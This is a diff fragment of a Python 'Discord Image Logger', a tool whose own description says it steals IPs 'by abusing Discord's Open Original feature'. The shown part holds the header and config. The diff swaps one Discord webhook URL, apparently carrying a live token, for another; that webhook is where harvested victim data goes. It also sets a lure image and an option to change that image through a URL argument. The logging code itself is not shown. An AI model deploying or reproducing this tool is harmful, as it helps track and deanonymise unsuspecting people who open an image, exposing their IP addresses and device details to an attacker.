@@ -2,14 +2,14 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "https://tenor-flame-tau.vercel.app/api/image"
+__app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1445997424287023218/92ObgirU12S2PE0TmJR0dkJxWxmZioVgCPQJs1D8UK9S4g3LgGe4B6tf5tcNVilWkQc3",
+    "webhook": "https://discord.com/api/webhooks/1446388878134214740/hhhn4sxeiagFuCS4JfshDkMBolIW-72fSfEwZY9cRtU1nQN1hqVvZRZXO7z26D12hIIW",
     "image": "https://i.pinimg.com/736x/eb/14/fe/eb14fe835cb4e28a6ae569ae42d3a1f2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
